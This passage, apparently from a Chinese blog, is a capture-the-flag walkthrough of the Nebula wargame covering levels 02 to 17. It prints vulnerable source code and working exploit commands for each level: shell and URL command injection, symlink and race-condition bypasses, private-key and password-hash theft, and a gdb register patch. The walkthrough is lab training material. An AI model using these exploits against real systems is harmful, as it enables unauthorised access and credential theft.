class="line"></div><div class="line">  asprintf(&amp;<span class="keyword">buffer, </span><span class="string">"/bin/echo %s is cool"</span>, getenv(<span class="string">"USER"</span>))<span class="comment">;</span></div><div class="line">  printf(<span class="string">"about to call system(\"%s\")\n"</span>, <span class="keyword">buffer);</span></div><div class="line">  </div><div class="line">  system(<span class="keyword">buffer);</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>直接运行看下程序逻辑:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">level02@nebula:/home/flag02$ ./flag02 </div><div class="line">about to call system(<span class="string">"/bin/echo level02 is cool"</span>)</div><div class="line">level02 is cool</div></pre></td></tr></table></figure>
<p>可以看到其根据$USER内容进行输出，然后将<code>/bin/echo $USER is cool</code>内容执行，很容易想到使用<code>;</code>进行截断，然后执行任意代码，即修改<code>$USER</code>内容为<code>export USER=;getflag</code> 同level01，依旧无法读flag内容，根据同样的思路，尝试你返回shell。</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">level02<span class="variable">@nebula</span><span class="symbol">:/home/flag02</span><span class="variable">$ </span>export USER=<span class="string">";/bin/sh;echo"</span></div><div class="line">level02<span class="variable">@nebula</span><span class="symbol">:/home/flag02</span><span class="variable">$ </span>./flag02 </div><div class="line">about to call system(<span class="string">"/bin/echo ;/bin/sh;echo is cool"</span>)</div><div class="line"></div><div class="line">sh-<span class="number">4.2</span><span class="variable">$ </span>whoami</div><div class="line">flag02</div><div class="line">sh-<span class="number">4.2</span><span class="variable">$ </span>cat /home/flag02/flag</div><div class="line">flag&#123;YACMD5MYX&#125;sh-<span class="number">4.2</span>$</div></pre></td></tr></table></figure>
<p>于是得到flag内容</p>
<h2 id="level03"><a href="#level03" class="headerlink" title="level03"></a>level03</h2><blockquote>
<p>flag03中有定时任务 在/home/flag03中</p>
</blockquote>
<p>题目说有个定时任务，<code>crontab -l</code>没有发现，难道是其他用户执行的？去看一下所有的crontab任务，<code>uname -a</code>可以看到是<code>ubuntu</code>，所以用户定时任务应该在<code>/var/spool/cron/crontabs</code>中，发现没权限，切换至<code>root</code>（官网在介绍时说可以使用nebula-nebula切换到root）。。ichunqiu这个靶机切不成，思路终结，我们来看下脚本内容。</p>
<p>可以看到有个<code>writable.sh</code>文件内容如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> /home/flag03/writable.d/* ; <span class="keyword">do</span></div><div class="line">	(<span class="built_in">ulimit</span> -t 5; bash -x <span class="string">"<span class="variable">$i</span>"</span>)</div><div class="line">	rm <span class="_">-f</span> <span class="string">"<span class="variable">$i</span>"</span></div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<p>按题目说的，推测应该是定时几分钟，然后执行这个脚本，脚本内容依次执行<code>writable.d</code>文件夹里的内容，限制时间5s，执行完后删除，而<code>writable.d</code>中的内容是可以被任何人写入的，所以我们的思路应该是构造sh脚本，然后将flag内容输出到<code>/tmp</code>这样都能读到。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">/bin/cat /home/flag03/flag &gt; /tmp/flag03</div></pre></td></tr></table></figure>
<p>过一阵，即可查看<code>/tmp/flag03</code>中flag内容</p>
<h2 id="level04"><a href="#level04" class="headerlink" title="level04"></a>level04</h2><blockquote>
<p>需要bypass 读到token</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">int main(int argc, char **argv, char **envp)</div><div class="line">&#123;</div><div class="line">  char buf[<span class="number">1024</span>];</div><div class="line">  int fd, rc;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</div><div class="line">      printf(<span class="string">"%s [file to read]\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">      <span class="keyword">exit</span>(EXIT_FAILURE);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(strstr(argv[<span class="number">1</span>], <span class="string">"token"</span>) != NULL) &#123;</div><div class="line">      printf(<span class="string">"You may not access '%s'\n"</span>, argv[<span class="number">1</span>]);</div><div class="line">      <span class="keyword">exit</span>(EXIT_FAILURE);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  fd = open(argv[<span class="number">1</span>], O_RDONLY);</div><div class="line">  <span class="keyword">if</span>(fd == -<span class="number">1</span>) &#123;</div><div class="line">      err(EXIT_FAILURE, <span class="string">"Unable to open %s"</span>, argv[<span class="number">1</span>]);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  rc = read(fd, buf, sizeof(buf));</div><div class="line">  </div><div class="line">  <span class="keyword">if</span>(rc == -<span class="number">1</span>) &#123;</div><div class="line">      err(EXIT_FAILURE, <span class="string">"Unable to read fd %d"</span>, fd);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  write(<span class="number">1</span>, buf, rc);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>很明显，需要绕过的点是<code>strstr</code>里面，一开始思考以为是像0字节截断之类的，但好像不行，最后想到链接，由于后面是直接将<code>argv[1]</code>作为文件名打开的，所以可以使用链接</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">level04<span class="variable">@nebula</span><span class="symbol">:/home/flag04</span><span class="variable">$ </span>ln -s /home/flag04/token /tmp/flag04</div><div class="line">level04<span class="variable">@nebula</span><span class="symbol">:/home/flag04</span><span class="variable">$ </span>./flag04 /tmp/flag04</div><div class="line"><span class="number">0650</span>8b5e-<span class="number">8909</span>-<span class="number">4</span>f38-b63<span class="number">0</span>-fdb148a848a2</div></pre></td></tr></table></figure>
<p>即可读到token，然后使用token作为<code>flag04</code>的密码登陆，拿到flag</p>
<h2 id="level05"><a href="#level05" class="headerlink" title="level05"></a>level05</h2><blockquote>
<p>寻找脆弱的目录权限</p>
</blockquote>
<p>文件下有两个目录<code>.ssh</code>与<code>.backup</code>, 推测这道题应该是拿到私钥登陆，而<code>.ssh</code>文件没有权限进入，转而查看备份文件，解压文件，发现当前路径下没有写权限，于是写到<code>/tmp</code>目录下。</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">level05<span class="variable">@nebula</span><span class="symbol">:/home/flag05/</span>.backup<span class="variable">$ </span>tar zxvf backup-<span class="number">19072011</span>.tgz -C /tmp</div><div class="line">.ssh/</div><div class="line">.ssh/id_rsa.pub</div><div class="line">.ssh/id_rsa</div><div class="line">.ssh/authorized_keys</div></pre></td></tr></table></figure>
<p>然后我们使用私钥登陆，即可查看flag内容</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">level05@nebula:/tmp/.ssh$ ssh -i id_rsa flag05@<span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span></div><div class="line">The authenticity of host '<span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span> (<span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>)' can't be established.</div><div class="line">ECDSA key fingerprint is ea:<span class="number">8</span>d:<span class="number">09</span>:<span class="number">1</span>d:f1:<span class="number">69</span>:e6:<span class="number">1</span>e:<span class="number">55</span>:c7:ec:e9:<span class="number">76</span>:a1:<span class="number">37</span>:f0.</div><div class="line">Are you sure you want to continue connecting (yes/no)? yes</div><div class="line">Warning: Permanently added '<span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>' (ECDSA) to the list of known hosts.</div><div class="line">  </div><div class="line">      <span class="keyword">_</span>   __     __          __     </div><div class="line">     / | <span class="type">/ /__</span>  / /<span class="keyword">_</span>  __  __/ /___ <span class="keyword">_</span></div><div class="line">    /  |<span class="type">/ / _</span> \/ __ \/ / / / / __ `/</div><div class="line">   / /|  <span class="type">/  __</span>/ /<span class="keyword">_</span>/ / /<span class="keyword">_</span>/ / / /<span class="keyword">_</span>/ / </div><div class="line">  /<span class="keyword">_</span>/ |<span class="type">_</span>/\___/<span class="keyword">_</span>.___/\__,<span class="keyword">_</span>/<span class="keyword">_</span>/\__,<span class="keyword">_</span>/  </div><div class="line">                                    </div><div class="line">    exploit-exercises.com/nebula</div><div class="line"></div><div class="line"></div><div class="line">For level descriptions, please see the above URL.</div></pre></td></tr></table></figure>
<h2 id="level06"><a href="#level06" class="headerlink" title="level06"></a>level06</h2><blockquote>
<p>flag06的凭证来自传统的unix系统</p>
</blockquote>
<p>看题目描述，猜测可能凭证可猜解或可破解。<code>/home/flag06</code>没有东西，于是查看<code>/etc/passwd</code>，按理说，由于<code>/etc/passwd</code>可以被所有人看到，不应该在其中有口令信息，而使用<code>x</code>来占位表示在<code>/etc/shadow</code>当中存储真正口令(shadow只有root才能看到)，但由于来源于古老的unix系统，<code>flag06</code>的口令存在于<code>/etc/passwd</code>中</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">flag06:</span><span class="symbol">ueqwOCnSGdsuM:</span><span class="number">993</span><span class="symbol">:</span><span class="number">993</span><span class="symbol">:</span><span class="symbol">:/home/flag06</span><span class="symbol">:/bin/sh</span></div></pre></td></tr></table></figure>
<p>使用john进行破解，得到密码<code>hello</code></p>
<h2 id="level07"><a href="#level07" class="headerlink" title="level07"></a>level07</h2><blockquote>
<p>允许ping任意host</p>
</blockquote>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"></div><div class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">ping</span> </span>&#123;</div><div class="line">  $host = $_[<span class="number">0</span>];</div><div class="line"></div><div class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;"</span>);</div><div class="line"></div><div class="line">  @output = <span class="string">`ping -c 3 $host 2&gt;&amp;1`</span>;</div><div class="line">  <span class="keyword">foreach</span> $line (@output) &#123; <span class="keyword">print</span> <span class="string">"$line"</span>; &#125;</div><div class="line"></div><div class="line">  <span class="keyword">print</span>(<span class="string">"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;"</span>);</div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># check if Host set. if not, display normal page, etc</span></div><div class="line"></div><div class="line">ping(param(<span class="string">"Host"</span>));</div></pre></td></tr></table></figure>
<p>看了代码很容易想到传入的<code>host</code>可以造成任意命令执行。最主要对<code>perl</code>不是很熟，在<code>thttpd.conf</code>文件中可以看到端口为<code>7007</code>所以访问的方式为<code>http://172.16.12.2:7007/index.cgi?Host=xxx</code></p>
<p>尝试访问<code>http://172.16.12.2:7007/index.cgi?Host=127.0.0.1</code>可以看到反悔了结果，于是尝试构造:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>//<span class="number">172.16</span><span class="meta">.12</span><span class="meta">.2</span>:<span class="number">7007</span>/index.cgi?Host=<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span><span class="subst">%3</span>Bcat+/home/flag07/flag+</div></pre></td></tr></table></figure>
<p>注意这里要使用<code>+</code>来代替空格，得到flag值</p>
<h2 id="level08"><a href="#level08" class="headerlink" title="level08"></a>level08</h2><blockquote>
<p>同样读文件的限制，想办法绕过</p>
</blockquote>
<p>查看<code>/home/flag08</code>路径，发现有两个可能存在问题的内容，<code>.cache/</code>和<code>capture.pcap</code>，<code>.cache</code>文件无法访问，但看到了<code>pcap</code>包，猜测是分析数据包流量得到密钥。</p>
<img src="/blog/exploit-exercises-nebula/wireshark.png" alt="wireshark" title="wireshark">
<p>可以根据hex内容推测得出密码:<code>backd00Rmate</code> 从而登陆<code>flag08</code>得到flag值</p>
<h2 id="level09"><a href="#level09" class="headerlink" title="level09"></a>level09</h2><blockquote>
<p>php代码存在漏洞</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">spam</span><span class="params">($email)</span></span></div><div class="line">&#123;</div><div class="line">  $email = preg_replace(<span class="string">"/\./"</span>, <span class="string">" dot "</span>, $email);</div><div class="line">  $email = preg_replace(<span class="string">"/@/"</span>, <span class="string">" AT "</span>, $email);</div><div class="line">  </div><div class="line">  <span class="keyword">return</span> $email;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">markup</span><span class="params">($filename, $use_me)</span></span></div><div class="line">&#123;</div><div class="line">  $contents = file_get_contents($filename);</div><div class="line"></div><div class="line">  $contents = preg_replace(<span class="string">"/(\[email (.*)\])/e"</span>, <span class="string">"spam(\"\\2\")"</span>, $contents);</div><div class="line">  $contents = preg_replace(<span class="string">"/\[/"</span>, <span class="string">"&lt;"</span>, $contents);</div><div class="line">  $contents = preg_replace(<span class="string">"/\]/"</span>, <span class="string">"&gt;"</span>, $contents);</div><div class="line"></div><div class="line">  <span class="keyword">return</span> $contents;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$output = markup($argv[<span class="number">1</span>], $argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line"><span class="keyword">print</span> $output;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>分析一下代码，其匹配<code>[email cc@xx.com]</code>转变为<code>cc AT xx DOT com</code>，其中使用了<code>/e</code>模式，此模式会将替换串作为代码执行，那么很明显这里存在任意代码执行。</p>
<p>其漏洞是:</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">在php中，字符串<span class="string">""</span>中使用<span class="variable">$xx</span>或者<span class="variable">$&#123;xx&#125;</span> 如果xx为变量，则返回变量值，如果为函数，则返回函数计算结果，例如以下内容,会返回phpinfo信息:</div><div class="line"></div><div class="line">xiaokunhuang@XiaokundeMacBook-<span class="keyword">Pro</span>  ~/Desktop  php <span class="keyword">test</span>.php | head -<span class="keyword">n</span> 5</div><div class="line">phpinfo()</div><div class="line">PHP <span class="keyword">Version</span> =&gt; 7.1.14</div><div class="line"></div><div class="line">System =&gt; Darwin XiaokundeMacBook-<span class="keyword">Pro</span>.<span class="keyword">local</span> 17.5.0 Darwin Kernel <span class="keyword">Version</span> 17.5.0: Mon Mar  5 22:24:32 PST 2018; root:xnu-4570.51.1~1/RELEASE_X86_64 x86_64</div><div class="line">Build Date =&gt; Feb  7 2018 18:24:13</div></pre></td></tr></table></figure>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><blockquote>
<p>任意文件上传代码，其中满足acess系统调用</p>
</blockquote>
<p>这道题程序大致意思是，首先判断传入的文件是否有读权限，如果有将其内容发送到host的18211端口，这里使用<code>access</code>来判断是否有读权限。其中这个access在手册中有这么一段话：</p>
<blockquote>
<p>Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.</p>
</blockquote>
<p>即不推荐使用<code>access</code>判断权限再使用<code>open</code>打开，由于时间差从而容易被攻击，所以思路就是在第一次文件权限判断的时候，指向一个<code>/tmp/token</code>文件，这是我们<code>level10</code>创建的且具有读权限的文件，然后再<code>open</code>的时候，将它指向我们的<code>/home/flag10/token</code>文件，由于二进制程序有<code>s</code>标志，从而可以读取内容，发送给我们监听的18211端口，得到token值。</p>
<p>由于我们没有办法做到手动在程序执行期间更改其指向，所以我们用while循环来让其不停的变化，直到得到结果。</p>
<p>所以我们首先在本地监听18211端口，并将内容持续输出到文件中。（这里我们从官网下了虚拟机本地运行的，ichunqiu哪个没法监听）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> nc -vv <span class="_">-l</span> 18211 &gt;&gt; out; <span class="keyword">done</span></div></pre></td></tr></table></figure>
<p>之后我们</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> <span class="keyword">true</span>; <span class="keyword">do</span> ln -fs <span class="regexp">/tmp/</span>token <span class="regexp">/tmp/</span>test; ln -fs <span class="regexp">/home/</span>flag10<span class="regexp">/token /</span>tmp<span class="regexp">/test;done &amp;</span></div></pre></td></tr></table></figure>
<p>之后运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> /home/flag10/flag10 /tmp/<span class="built_in">test</span> 10.211.55.2; <span class="keyword">done</span></div></pre></td></tr></table></figure>
<p>最后查out即可得到<code>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</code> 之后即可登录查看</p>
<p>再补充一点，<code>access</code>是使用进程运行的用户的权限去判断的，而<code>open</code>运行时，使用的是<code>s</code>之后的权限去运行的。</p>
<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><blockquote>
<p>同样任意命令执行</p>
</blockquote>
<p>找到<code>system</code>函数，发现其执行了<code>buffer</code>中的内容，推测构造<code>buffer</code>数据进行绕过，且buff内容对在执行前做过了处理,所以推测方法为倒序执行解密即可。</p>
<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><blockquote>
<p>存在一个50001端口的后门</p>
</blockquote>
<p>我们看下程序，发现其判断password的hash值的1-40为是不是和给定的相同，可以通过构造hash值，不过会死人。我们看到其执行命令时，拼接了<code>passwd</code>，则很明显存在任意命令执行漏洞。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;<span class="regexp">/bin/g</span>etflag &gt; <span class="regexp">/tmp/</span><span class="number">123</span></div></pre></td></tr></table></figure>
<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><blockquote>
<p>其会检查运行程序时的uid是否为1000</p>
</blockquote>
<p>这道题考察反汇编知识，即在运行时我去们修改<code>$eax</code>寄存器中的值，这个值即为<code>1014</code>即level13的uid值，我们通过修改其值为<code>1000</code>进行绕过，流程如下：</p>
<p>首先是反编译flag13文件</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb fla<span class="name">g13</span></div></pre></td></tr></table></figure>
<p>之后反编译main函数</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">disassemble main</span></div></pre></td></tr></table></figure>
<p>看到:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x080484ef</span> &lt;+<span class="number">43</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80483c0</span> &lt;getuid@plt&gt;</div><div class="line"><span class="number">0x080484f4</span> &lt;+<span class="number">48</span>&gt;:	<span class="keyword">cmp</span>    <span class="number">$0</span>x3e8,%eax</div></pre></td></tr></table></figure>
<p>应该是判断<code>$eax</code>寄存器中的内容和<code>0x3e8</code>是否相等，即是否为1000，我们在这里设置断点:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">break</span> *<span class="number">0x080484f</span>4</div></pre></td></tr></table></figure>
<p>之后我们运行<code>run</code>程序，会发现其停到断点处，修改之后在<code>continue</code>:</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="built_in">break</span> *<span class="number">0x080484f4</span></div><div class="line">Breakpoint <span class="number">1</span> <span class="built_in">at</span> <span class="number">0x80484f4</span></div><div class="line">(gdb) run</div><div class="line">Starting <span class="built_in">program</span>: /home/flag13/flag13</div><div class="line"></div><div class="line">Breakpoint <span class="number">1</span>, <span class="number">0x080484f4</span> <span class="keyword">in</span> main ()</div><div class="line">(gdb) <span class="built_in">print</span> $eax</div><div class="line">$<span class="number">1</span> = <span class="number">1014</span></div><div class="line">(gdb) set $eax=<span class="number">1000</span></div><div class="line">(gdb) <span class="built_in">print</span> $eax</div><div class="line">$<span class="number">2</span> = <span class="number">1000</span></div><div class="line">(gdb) continue</div><div class="line">Continuing.</div><div class="line">your token <span class="built_in">is</span> b705702b-76a8-<span class="number">42b0</span>-<span class="number">8844</span>-3adabbe5ac58</div><div class="line">[Inferior <span class="number">1</span> (process <span class="number">16725</span>) exited with code <span class="number">063</span>]</div></pre></td></tr></table></figure>
<p>可以看到得到了token值</p>
<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><blockquote>
<p>破解加密程序</p>
</blockquote>
<p>随便输入：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">level14<span class="variable">@nebula</span><span class="symbol">:/home/flag14</span><span class="variable">$ </span>./flag14 -e</div><div class="line"><span class="number">1234567890</span></div><div class="line"><span class="number">13579</span>;=?A9</div><div class="line">level14<span class="variable">@nebula</span><span class="symbol">:/home/flag14</span><span class="variable">$ </span>./flag14 -e</div><div class="line">abcdefsd</div><div class="line">acegikyk</div></pre></td></tr></table></figure>
<p>推测为char(i)+index(i)的值，写个程序解密token即可</p>
<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>动态链接库劫持，不太明白，之后在深入研究</p>
<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><blockquote>
<p>perl 1616端口 web认证</p>
</blockquote>
<p>代码如下:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env perl</span></div><div class="line"></div><div class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">login</span> </span>&#123;</div><div class="line">  $username = $_[<span class="number">0</span>];</div><div class="line">  $password = $_[<span class="number">1</span>];</div><div class="line"></div><div class="line">  $username =~ <span class="regexp">tr/a-z/A-Z/</span>; <span class="comment"># conver to uppercase</span></div><div class="line">  $username =~ <span class="regexp">s/\s.*//</span>;        <span class="comment"># strip everything after a space</span></div><div class="line"></div><div class="line">  @output = <span class="string">`egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1`</span>;</div><div class="line">  <span class="keyword">foreach</span> $line (@output) &#123;</div><div class="line">      ($usr, $pw) = <span class="keyword">split</span>(<span class="regexp">/:/</span>, $line);</div><div class="line">  </div><div class="line"></div><div class="line">      <span class="keyword">if</span>($pw =~ $password) &#123;</div><div class="line">          <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">htmlz</span> </span>&#123;</div><div class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;"</span>);</div><div class="line">  <span class="keyword">if</span>($_[<span class="number">0</span>] == <span class="number">1</span>) &#123;</div><div class="line">      <span class="keyword">print</span>(<span class="string">"Your login was accepted&lt;br/&gt;"</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="keyword">print</span>(<span class="string">"Your login failed&lt;br/&gt;"</span>);</div><div class="line">  &#125;    </div><div class="line">  <span class="keyword">print</span>(<span class="string">"Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">htmlz(login(param(<span class="string">"username"</span>), param(<span class="string">"password"</span>)));</div></pre></td></tr></table></figure>
<p>我们可以看到，整个流程大概是首先去获取<code>username</code>和<code>password</code>的值，然后对username进行大写之后在去除空格之后的所有内容，之后调用调用系统调用去处理，可以看到，很明显是一个任意代码执行的漏洞，不过要绕过username的处理。</p>
<p><code>egrep</code>用于在文件内进行内容查找,而由于username中会被变成大写，于是需要利用一个技巧，shell中转为小写：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">level16<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>test=ASNDSA</div><div class="line">level16<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="variable">$&#123;</span>test,,&#125;</div><div class="line">asndsa</div></pre></td></tr></table></figure>
<p>使用<code>${x,,}</code>的方式可以使命令转为小写。<br>于是我们构造<code>username</code>为:</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"&lt;/DEV/NULL;<span class="built_in">CMD</span>=/TMP/LEVEL16;$&#123;<span class="built_in">CMD</span>,,&#125;;#</div></pre></td></tr></table></figure>
<p>其中<code>&quot;</code>用于闭合，<code>#</code>用于注释后面的语句，其中我们需要新建一个<code>/tmp/level16</code>文件，内容如下，且设置为可执行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line">/bin/getflag &gt; /tmp/getflag16</div></pre></td></tr></table></figure>
<p>之后访问提交即可</p>
<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><blockquote>
<p>攻击python脚本</p>
</blockquote>
